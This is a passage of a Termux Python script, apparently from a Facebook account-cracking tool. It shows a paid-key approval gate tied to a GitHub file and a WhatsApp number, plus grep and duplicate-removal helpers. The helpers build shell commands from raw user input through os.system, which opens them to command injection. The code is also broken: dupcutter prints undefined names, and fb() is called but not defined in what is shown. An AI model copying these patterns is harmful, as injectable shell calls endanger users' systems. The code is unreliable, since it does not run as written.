\x1b[1;92m[âž¤âž¤âž¤âž¤]\x1b[1;97mauthor: AsadMalik(\x1b[1;92mmrd4d4\x1b[1;97m)
\x1b[1;92m[âž¤âž¤âž¤âž¤]\x1b[1;97mstatus: premium
\033[41m\033[1;37m The unbeatable chokra \033[41m\033[1;37mMr Dada\x1b[0m
          
    \033[47m\033[1;31m AsadMalik \033[41m\033[1;37m X  Bilal \x1b[0m\n"""
linesmall = "-----------------------------------------------------------"
linelarg = "-----------------------------------------------------------------------"
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()



def reg():
    os.system("clear")
    logo()
    print("")
    print("\tGet Approvel First")
    print("")
    time.sleep(1)
    try:
        to = open("/data/data/com.termux/files/usr/bin/.mk1.2.txt", "r").read()
    except (KeyError , IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/itz-MK-302/MK1.2/main/mk.txt').text
    if to in r:
        os.system('clear')
        logo()
        fb()
        print("")
    
        print(" ")
    else:
        os.system("clear")
        logo()
        print("")
        print("\tYour Key is Not Approved")
        print("")
        print(" This Tool is Free But You Need Approval  ")
        print("")
        print(" Copy And Send Key To Admin")
        print("")
        print(" Your key: "+to)
        print("")
        input(" Press enter to send key")
        os.system("xdg-open https://wa.me/+923409453921")
        reg()
def reg2():
    os.system("clear")
    logo()
    print("")
    print("\tYour Key is Not Approved")
    print("")
    print(" Copy And Press Enter , Then Select Whatsapp To Continue")
    print("")
    id = uuid.uuid4().hex[:75]
    s = open('/data/data/com.termux/files/usr/bin/.mk1.2.txt', 'w')
    s.write(id)
    s.close()
    ids = open('/data/data/com.termux/files/usr/bin/.mk1.2.txt', 'r').read()
    print(" Your key: "+ids)
    print("")
    print("")
    input(" Press enter to go to whatsapp ")
    os.system("xdg-open https://wa.me/+923409453921")
    input(" Press Enter To Check Registration ")
    reg()

def real_time():
    from time import time
    return str(time()).split('.')[0]
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def jalanx(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.09)
def logo():
    time.sleep(0.5)
    os.system("clear")
    time.sleep(0.5)
    print(linesmall)
    print("")
    time.sleep(0.5)
    version = '0.2'
    note = 'This TooLs iS PaiD'
    print(banner)
    print('AerOplaNe mOdE mUst bE iN 5 MiNt')
    print(linesmall)
    print("")


def grep():
    logo()
    print("[*] Enter Separate Object Find In File - Example ");time.sleep(0.3)
    print("[*] 100077  -  100078  -  100079  -  100080  -  100081 ");time.sleep(0.3)
    print("[*] 1000  -  10000  -  100000  -  1000000  -   1000000 \n\n ");time.sleep(0.3)
    g = input('\033[0;97m[->] Separate : ')
    f = input('\033[0;97m[->] File Path : ')
    o = input('\033[0;97m[->] Save As : ')
    os.system('touch ' +o)
    os.system('cat '+f+' | grep '+g+' > ' +o)
    print("")
    print("")
    print(linesmall)
    print("[*] Separating Successful \n [*] Separate " + g + " From " + f )
    print("[*] New File Save " + o)
    print(linesmall)
    print("\n\n")
    time.sleep(2)


def dupcutter():
    logo()
    print("[*] File Duplicate Object Cutter - Auto Object ")
    print("[*] Enter File Path / File Location  \n\n")
    bilal = input('[->] File Path   : ')
    haider = input('[->] New File Save As : ')
    os.system('touch ' +haider)
    os.system('sort -r '+bilal+' | uniq > '+haider)
    print("")
    print("")
    print(linesmall)
    print("[*] Removing Successful  From File " + Asad )
    print("[*] New File Save " + Afzal )
    print(linesmall)
    print("\n\n")
    time.sleep(2)

    
        

if __name__=='__main__':
    fb()

